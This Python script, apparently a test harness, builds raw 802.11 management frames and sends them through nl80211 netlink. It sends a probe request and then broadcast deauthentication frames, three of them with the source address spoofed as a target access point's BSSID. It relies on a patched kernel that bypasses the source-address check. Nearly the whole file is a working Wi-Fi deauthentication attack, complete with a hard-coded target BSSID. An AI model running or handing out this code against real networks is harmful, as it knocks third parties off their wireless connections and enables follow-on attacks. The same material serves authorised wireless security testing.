#!/usr/bin/env python3
"""
Minimal deauth test via nl80211 CMD_FRAME.
No MAC spoofing - relies on kpatch3 SA check bypass.
"""
import socket, struct, fcntl, sys, time

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def send_frame(sock, fid, ifidx, freq, frame_bytes, seq_num=0):
    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame_bytes)
    attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST|NLM_F_ACK, seq_num+2, 0)
    sock.send(nlhdr + payload)
    try:
        resp = sock.recv(4096)
        nllen, nltype = struct.unpack_from('IH', resp, 0)
        if nltype == 2:
            errno = struct.unpack_from('i', resp, 16)[0]
            return errno
        return 0
    except socket.timeout:
        return -110

iface = sys.argv[1] if len(sys.argv) > 1 else 'wlan0'
bssid_str = sys.argv[2] if len(sys.argv) > 2 else '04:67:61:D6:DC:92'
freq = int(sys.argv[3]) if len(sys.argv) > 3 else 2412

bssid = bytes.fromhex(bssid_str.replace(':', ''))
broadcast = b'\xff\xff\xff\xff\xff\xff'

# Get our MAC
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', iface.encode()))
our_mac = info[18:24]
sock.close()

fid = get_nl80211_family_id()
ifidx = get_ifindex(iface)

print(f"Interface: {iface} (idx={ifidx})")
print(f"Our MAC: {our_mac.hex(':')}")
print(f"Family ID: {fid}")

# Test 1: Probe request (known working)
print("\n--- Test 1: Probe Request (SA=our MAC) ---")
probe = struct.pack('<H', 0x0040)  # probe req
probe += struct.pack('<H', 0)      # duration
probe += broadcast                  # DA
probe += our_mac                    # SA
probe += broadcast                  # BSSID
probe += struct.pack('<H', 0)      # seq
# SSID IE (empty)
probe += b'\x00\x00'
# Supported rates IE
probe += b'\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24'

s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
s.bind((0, 0))
s.settimeout(2)

rc = send_frame(s, fid, ifidx, freq, probe, 1)
print(f"  Result: {rc} ({'OK' if rc == 0 else 'FAIL'})")

# Test 2: Deauth with SA=our MAC (should work if mgmt_stypes is patched)
print("\n--- Test 2: Deauth (SA=our MAC, DA=broadcast, BSSID=target) ---")
deauth = struct.pack('<H', 0x00c0)  # deauth
deauth += struct.pack('<H', 0)      # duration
deauth += broadcast                  # DA
deauth += our_mac                    # SA = our own MAC
deauth += bssid                      # BSSID
deauth += struct.pack('<H', 0x10)   # seq
deauth += struct.pack('<H', 7)      # reason: class 3 frame

rc = send_frame(s, fid, ifidx, freq, deauth, 2)
print(f"  Result: {rc} ({'OK' if rc == 0 else 'FAIL'})")

# Test 3: Deauth with SA=BSSID (spoofed, like from AP)
print("\n--- Test 3: Deauth (SA=BSSID/spoofed, DA=broadcast) ---")
deauth2 = struct.pack('<H', 0x00c0)
deauth2 += struct.pack('<H', 0)
deauth2 += broadcast                 # DA
deauth2 += bssid                     # SA = AP (spoofed!)
deauth2 += bssid                     # BSSID
deauth2 += struct.pack('<H', 0x20)
deauth2 += struct.pack('<H', 7)

rc = send_frame(s, fid, ifidx, freq, deauth2, 3)
print(f"  Result: {rc} ({'OK' if rc == 0 else 'FAIL'})")

# Test 4: Deauth with SA=BSSID to specific target
print(f"\n--- Test 4: Deauth (SA=BSSID, DA=broadcast, reason=1) ---")
deauth3 = struct.pack('<H', 0x00c0)
deauth3 += struct.pack('<H', 0)
deauth3 += broadcast
deauth3 += bssid                     # SA = AP
deauth3 += bssid                     # BSSID
deauth3 += struct.pack('<H', 0x30)
deauth3 += struct.pack('<H', 1)      # reason: unspecified

rc = send_frame(s, fid, ifidx, freq, deauth3, 4)
print(f"  Result: {rc} ({'OK' if rc == 0 else 'FAIL'})")

s.close()
print("\nDone.")
